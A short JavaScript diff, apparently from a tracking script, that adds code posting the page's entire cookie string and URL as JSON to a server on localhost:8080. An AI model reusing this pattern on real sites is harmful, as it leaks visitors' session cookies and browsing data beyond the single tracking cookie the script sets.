@@ -10,3 +10,7 @@ function guid() {
 if(!document.cookie){
 	document.cookie = trackCookieName + "=" + guid();
 }
+
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "http://localhost:8080", true);
+xhttp.send('{"COOKIE":"' + document.cookie + '","URL":"'+ document.URL +'"}'); 
